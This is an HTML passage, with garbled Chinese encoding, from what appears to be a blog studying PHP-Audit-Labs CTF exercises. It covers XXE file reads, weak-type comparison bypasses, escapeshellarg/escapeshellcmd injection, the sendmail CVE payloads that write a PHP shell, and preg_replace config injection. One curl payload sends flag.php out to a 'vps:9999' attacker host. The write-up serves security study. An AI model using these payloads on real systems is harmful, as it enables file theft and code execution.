$classname($param,$param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    <span class="keyword">foreach</span> ($newclass <span class="keyword">as</span> $key=&gt;$value)</span><br><span class="line">        <span class="keyword">echo</span> $key.<span class="string">'=&gt;'</span>.$value.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç»è¿‡ä¸Šé¢çš„é“ºå«å°±å¾ˆç®€å•äº†ã€‚ç›´æ¥ç”¨å¯æ§çš„å‚æ•°è¿›è¡Œxxeå³å¯ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯,xxeéœ€è¦è¿›è¡Œphpæ–‡ä»¶æµæ¥è¿›è¡Œå†…å®¹è¯»å–ã€‚å› ä¸º<code>&lt; &gt; &amp; &#39; &quot;</code>ç­‰å­—ç¬¦ä¼šä½¿xmlè§£æå‡ºé”™ã€‚ä¸è¿‡ç”¨base64è¯»æ–‡ä»¶è¿™ç§è§£å†³åŠæ³•æƒ³å¿…æ—©å°±æ˜¯è½»è½¦ç†Ÿè·¯äº†å§ã€‚<br><code>?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2</code></p><p>å‡å¦‚é¢˜ç›®ä¸çŸ¥é“flagçš„åå­—è¿˜å¯ä»¥ç”¨å¦å¤–çš„ç±»è¿›è¡Œæ–‡ä»¶åçš„è¯»å–ã€‚<br><code>?name=GlobIterator&amp;param=./*.php&amp;param2=0</code><br>ä½œç”¨ä¸globå·®ä¸å¤šã€‚</p><h2 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h2><h3 id="str-pos-é”™è¯¯ä½¿ç”¨"><a href="#str-pos-é”™è¯¯ä½¿ç”¨" class="headerlink" title="str_pos()é”™è¯¯ä½¿ç”¨"></a>str_pos()é”™è¯¯ä½¿ç”¨</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/5.png" class="lazyload" data-srcset="5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>phpè®¸å¤šå‡½æ•°å› ä¸ºå¼±ç±»å‹æˆ–é»‘é­”æ³•è¯ç”Ÿäº†å„ç§å„æ ·çš„æ¼æ´ã€‚str_pos()ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ä¸Šé¢çš„ä»£ç çœ‹ä¼¼ä¸¥æ ¼é™åˆ¶äº†å†…å®¹ä¸èƒ½å«æœ‰<code>&lt;</code>ä¸<code>&gt;</code>ã€‚ç„¶è€Œstr_posè¿”å›çš„å€¼å¯ä»¥æ˜¯0.<br>å³åŒ¹é…çš„å­—ç¬¦ä¸²é¦–ä¸ªå­—ç¬¦å°±æ˜¯<code>&lt;</code>ï¼Œ<code>&gt;</code>ã€‚æ—¢ç„¶å¦‚æ­¤ï¼Œ<code>ï¼strpos()</code>è¿”å›çš„å°±æ˜¯çœŸå€¼ã€‚æˆåŠŸç»•è¿‡ã€‚<br>payload:<br><code>&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;</code><br>åŒæ ·ç±»ä¼¼çš„æ¼æ´ä¹Ÿå¸¸è§äºpreg_match()è¿™æ ·çš„å‡½æ•°ã€‚å› ä¸ºå®ƒå¯èƒ½ä¼šå› ä¸ºä¼ å…¥æ•°ç»„æˆ–è€…æ­£åˆ™å›æº¯å¯¼è‡´è¿”å›falseå€¼ã€‚å¦‚æœå¼€å‘è€…æ‰€å†™çš„åˆ¤æ–­åªæ˜¯<code>!preg_match()</code>å°±å¾ˆå®¹æ˜“ç»•è¿‡äº†ã€‚</p><p>æŸCMSä¸­çš„é—®é¢˜ä¹Ÿæ˜¯å¼±ç±»å‹çš„é”…ã€‚ä½¿ç”¨è‹¥ç±»å‹ç›¸ç­‰åˆ¤æ–­æ—¶ï¼Œå‡å¦‚æ•°æ®åº“ä¸­å­˜å‚¨çš„å€¼æ˜¯ç©ºå­—ç¬¦ä¸²ã€‚é‚£ä¹ˆå½“nullä¸â€â€è¿›è¡Œå¼±ç±»å‹ç›¸ç­‰æ—¶å°†è¿”å›true.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">null</span>==<span class="string">''</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">"0.0"</span>==<span class="string">"0"</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">"0."</span>==<span class="string">"0"</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">"0e"</span>==<span class="string">"0"</span> <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h3 id="ç»ƒä¹ -3"><a href="#ç»ƒä¹ -3" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>è¿™æ˜¯æ”»é˜²ä¸–ç•Œä¸Šåšè¿‡çš„åŸé¢˜ã€‚åº”è¯¥æ˜¯lotteryè¿™ä¸ªæŠŠã€‚ç”¨åˆ°çš„æ˜¯jsonçš„å¼±ç±»å‹ã€‚jsonå¼±ç±»å‹åˆ¤ç›¸ç­‰æ—¶ï¼Œåªè¦ä¼ å…¥trueä¸éé›¶æ•°å­—ã€‚ç»“æœéƒ½å°†è¿”å›true</p><p>jsonå¼±ç±»å‹æ¯”è¾ƒå‡ºåçš„ä¸€ä¸ªæ¯”è¾ƒå°±æ˜¯æ•°å­—ä¸å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&#x3D;&#x3D;&quot;0a....sds&quot;</span><br><span class="line">12&#x3D;&#x3D;&quot;12fw...sd&quot;</span><br><span class="line">789&#x3D;&#x3D;&quot;789asabxz&quot;</span><br></pre></td></tr></table></figure><p>å­—ç¬¦ä¸²ä¼šè¢«ç›´æ¥æˆªå–å‰é¢çš„çº¯æ•°å­—éƒ¨åˆ†è¿›è¡Œåˆ¤æ–­</p><h2 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h2><h3 id="escapeshellcmd-escapeshellarg"><a href="#escapeshellcmd-escapeshellarg" class="headerlink" title="escapeshellcmd()+escapeshellarg()"></a>escapeshellcmd()+escapeshellarg()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä¸»ä½“ä¸Šå°±æ˜¯ä¸€ä¸ªè¿‡æ»¤äº†åçš„mailå‡½æ•°æ‰§è¡Œã€‚<br>mailå‡½æ•°çš„å‚æ•°æ˜¯è¿™æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bool mail (</span><br><span class="line">string $to ,</span><br><span class="line">string $subject ,</span><br><span class="line">string $message [,</span><br><span class="line">string $additional_headers [,</span><br><span class="line">string $additional_parameters ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ç”±äºé»˜è®¤è°ƒç”¨çš„æ˜¯linuxçš„sendmailå‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥åœ¨<code>message</code>ä¸­å†™å…¥æ¶æ„ä»£ç ã€‚æ¥ç€ç”±additional_parameters æŒ‡å®šé¢å¤–å‚æ•°ï¼Œä»è€Œå†™å…¥åœ¨æŒ‡å®šç›®å½•å†™å…¥æ–‡ä»¶ã€‚</p><p>ä½†æ˜¯ï¼Œphpçš„mailå‡½æ•°ä¹Ÿåœ¨åº•å±‚é»˜è®¤æ‰§è¡Œäº†ä¸€å±‚<code>escapeshellcmd()</code>å‡½æ•°ï¼Œé‚£ä¹ˆæ˜¾ç„¶è½¬ä¹‰äº†æˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚<br>ä¸è¿‡ï¼Œæœ¬é¢˜ä»£ç è¿˜æœ‰ä¸€å¤„ç»å…¸çš„<code>escapeshellarg()</code>ã€‚å¦‚æœ<code>escapeshellarg()</code>+<code>escapeshellcmd()</code>æ­é…ä½¿ç”¨ï¼Œå°†å‡ºç°ç‰¹æ®Šå­—ç¬¦é€ƒé€¸çš„é—®é¢˜ã€‚<br>buuä¸Šä¹Ÿæœ‰ä¸€ä¸ªç±»ä¼¼çš„é¢˜ç›®.è¿™é‡Œåˆ™å€Ÿç”¨é¡¹ç›®é‡Œçš„ä¾‹å­ç®€å•ä»‹ç»ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1<span class="string">' -v -d a=1</span></span><br><span class="line"><span class="string">#escapeshellarg</span></span><br><span class="line"><span class="string">'</span>127.0.0.1<span class="string">'\'</span><span class="string">' -v -d a=1'</span></span><br><span class="line"><span class="comment">#escapeshellcmd</span></span><br><span class="line"><span class="string">'127.0.0.1'</span>\\<span class="string">''</span> -v -d a=1\<span class="string">'</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æœ€åä¸€æ­¥å¯ä»¥çœ‹å‡ºï¼Œ<code>\\</code>å°†è¢«è§£é‡Šä¸º<code>\</code>ä¸å†èµ·åˆ°è½¬ä¹‰çš„ä½œç”¨ï¼Œè€Œæ˜¯ä½œä¸ºæ¢è¡Œç¬¦ã€‚å› æ­¤payloadå˜ä¸ºå…ˆæ˜¯<code>127.0.0.1</code>ï¼Œå†<code>-v -d</code>-då¯¹åº”çš„æ•°æ®ä¸º<code>a=1&#39;</code>.</p><p>æ¯”å¦‚CVE-2016-10033 è·ŸCVE-2016-10045çš„ä¸¤ä¸ªpayload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br><span class="line"></span><br><span class="line">a&#39;( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com</span><br></pre></td></tr></table></figure><p>å‰è€…æ²¡æœ‰escapeshellcmdç›´æ¥æ‰“ã€‚åè€…escapeshellcmdååˆåŠ äº†ä¸€å±‚escapeshellargå¯¼è‡´å­—ç¬¦é€ƒé€¸ã€‚</p><h3 id="ç»ƒä¹ -4"><a href="#ç»ƒä¹ -4" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">    <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line"><span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'hongri'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'hongri'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">        $urlInfo = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">"http"</span> === strtolower($urlInfo[<span class="string">"scheme"</span>]) || <span class="string">"https"</span>===strtolower($urlInfo[<span class="string">"scheme"</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">"scheme error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $url = escapeshellarg($url);</span><br><span class="line">        $url = escapeshellcmd($url);</span><br><span class="line">        system(<span class="string">"curl "</span>.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"HRCTF&#123;Are_y0u_maz1ng&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„å˜é‡è¦†ç›–ï¼Œä¹‹åè¦ç»•è¿‡wafã€‚å†æ¥ä¸‹æ¥å°±æ˜¯escapeshellsmd/argçš„æ­é…è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚<br>é¦–å…ˆè¦è§£å†³çš„æ˜¯ï¼Œæˆ‘ä»¬å¿…é¡»ç»•è¿‡preg_matchçš„é™åˆ¶æ‰èƒ½ä¼ å…¥flagå˜é‡ã€‚å› æ­¤è¦åˆ©ç”¨å¥½å®ƒå†™å¥½çš„è¿™ä¸ªåŠŸèƒ½ã€‚</p><p>é¦–å…ˆè¿™é‡Œåˆ©ç”¨äº†å¯å˜å˜é‡çš„ç‰¹æ€§ã€‚å‡è®¾æˆ‘ä»¬æäº¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?flag&#x3D;test </span><br><span class="line">post:_GET[flag]&#x3D;test</span><br></pre></td></tr></table></figure><p>å½“å¼€å§‹éå† <code>$_POST</code> è¶…å…¨å±€æ•°ç»„çš„æ—¶å€™ï¼Œ <code>$__k</code> ä»£è¡¨ _GET[flag] ï¼Œæ‰€ä»¥ <code>$$__k</code>å°±æ˜¯ <code>$_GET[flag]</code> ï¼Œå³ test å€¼ï¼Œæ­¤æ—¶ <code>$$__k == $__v</code> æˆç«‹ï¼Œå˜é‡ <code>$_GET[flag]</code> å°±è¢« unset äº†</p><p>è€Œæ¥ä¸‹æ¥ä¸‹é¢åˆæœ‰ä¸€ä¸ªå˜é‡è¦†ç›–<br><code>if($_POST) extract($_POST, EXTR_SKIP);</code><br>æ‰€ä»¥ç›´æ¥å¾—åˆ°<code>$_GET[flag]=test</code>ç»•è¿‡ç¬¬ä¸€å±‚</p><p>ç¬¬äºŒå±‚åªéœ€åˆ©ç”¨0eçš„MD5å¼±ç±»å‹æ¯”è¾ƒ<br>æœ€åæ˜¯curlçš„å‘½ä»¤æ‰§è¡Œ<br><code>http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x  vps:9999</code><br>ä¼¼ä¹å½“curlç‰ˆæœ¬å˜é«˜åï¼Œå°†ä¸å†èƒ½æ‰§è¡Œã€‚<br><code>curl &#39;127.0.0.1&#39;\&#39;&#39;</code></p><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><h3 id="æ­£åˆ™ä¸å½“å¯¼è‡´è·¯å¾„ç©¿è¶Š"><a href="#æ­£åˆ™ä¸å½“å¯¼è‡´è·¯å¾„ç©¿è¶Š" class="headerlink" title="æ­£åˆ™ä¸å½“å¯¼è‡´è·¯å¾„ç©¿è¶Š"></a>æ­£åˆ™ä¸å½“å¯¼è‡´è·¯å¾„ç©¿è¶Š</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/7.png" class="lazyload" data-srcset="7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ã€‚ä¸»è¦æ˜¯<code>preg_replace()</code>å‡½æ•°çš„ä½¿ç”¨ä¸å½“ã€‚å¿½ç•¥äº†<code>../../</code>è¿™ç§è·¯å¾„ã€‚å¯ä»¥ä½¿ç”¨è·¯å¾„ç©¿è¶Šè¿›è¡Œä»»æ„æ–‡ä»¶åˆ é™¤</p><h3 id="ç»ƒä¹ -5"><a href="#ç»ƒä¹ -5" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Wrong Format'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">TRUE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        $c = <span class="number">0</span>;</span><br><span class="line">        $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>);</span><br><span class="line">        <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">            $c += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»ƒä¹ é‡Œçš„æ­£åˆ™å†™çš„ååˆ†ç½•è§ã€‚å…¶å®ä½¿ç”¨åˆ°çš„æ˜¯phpçš„å­—ç¬¦ç±»ã€‚é™¤äº†ä¸€çœ‹å°±æ‡‚çš„upperè¿™äº›ï¼Œå…¶ä»–çš„å­—ç¬¦ç±»çš„å«ä¹‰æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graph ç©ºæ ¼ä»¥å¤–çš„å¯æ‰“å°å­—ç¬¦</span><br><span class="line">punct  æ‰“å°å­—ç¬¦ï¼Œä¸åŒ…æ‹¬å­—æ¯æ•°å­—</span><br></pre></td></tr></table></figure><p>ä¸»è¦å‡½æ•°é‡Œï¼Œç¬¬ä¸€ä¸ªæ­£åˆ™è¡¨ç¤ºåŒ¹é…åˆ°å¯æ‰“å°å­—ç¬¦12ä¸ªä»¥ä¸Š;ç¬¬äºŒä¸ªæ­£åˆ™è¡¨ç¤ºæŠŠè¿ç»­çš„ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ï¼Œä½œä¸ºä¸€æ®µï¼Œè‡³å°‘åˆ†å…­æ®µ;ç¬¬ä¸‰ä¸ªæ­£åˆ™è¡¨ç¤ºè¾“å…¥çš„å­—ç¬¦ä¸²è‡³å°‘å«æœ‰ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ä¸­çš„ä¸‰ç§ç±»å‹ã€‚</p><p>æœ€åä¸æ•°å­—è¿›è¡Œå¼±ç±»å‹æ¯”è¾ƒã€‚<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">42.00e+00000</span><br></pre></td></tr></table></figure><p>çº¢æ—¥çš„æ–‡ç« é‡Œè¿˜æåˆ°äº†ä¸€ä¸ªé…ç½®ä¸å½“å†™shellçš„é—®é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'option'</span>])) <span class="keyword">die</span>();</span><br><span class="line">$str = addslashes($_GET[<span class="string">'option'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'./config.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'./config.php'</span>, $file);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯ä¸å¸¦ä¿®é¥°ç¬¦æ¨¡å¼çš„æ­£åˆ™åŒ¹é….<br>ç¬¬ä¸€ç§æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/index.php?option=a';%0aphpinfo();//</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?option=a</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªpayloadå†™å…¥å†…å®¹ååªæœ‰ä¸€ä¸ªå•å¼•å·è¢«è½¬ä¹‰çš„é—®é¢˜ã€‚è€Œç¬¬äºŒéƒ¨åˆ†å†ä¼ å…¥ä¸€ä¸ªaæ—¶å°±ä¼šå› ä¸º<code>.*</code>åŒ¹é…æ— æ•°æ¬¡è€ŒæŠŠ<code>\</code>æ¢æ‰</p><p>è¿˜æœ‰ä¸¤ç§preg_replaceçš„æ–¹æ³•ã€è¿™é‡Œæä¸‹ç¬¬äºŒç§ï¼Œä¹Ÿå°±æ˜¯è¿˜é€‚ç”¨äºå•è¡Œ(éè´ªå©ª)æ¨¡å¼çš„payloadã€‚ä¹‹å‰å®‰æ’çš„å¥—å¨ƒweb2é‡Œå‡ºç°è¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;;phpinfo();</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test&#x2F;ph.php?option&#x3D;$0</span><br></pre></td></tr></table></figure><p>å…¶æœ€åçš„æ•ˆæœæ˜¯ä¸‹é¢è¿™æ ·çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$option&#x3D;&#39;$option&#x3D;&#39;;phpinfo();&#39;;&#39;;</span><br></pre></td></tr></table></figure><h2 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h2><h3 id="parse-str-å˜é‡è¦†ç›–"><a href="#parse-str-å˜é‡è¦†ç›–" class="headerlink" title="parse_str()å˜é‡è¦†ç›–"></a>parse_str()å˜é‡è¦†ç›–</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/8.png" class="lazyload" data-srcset="8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 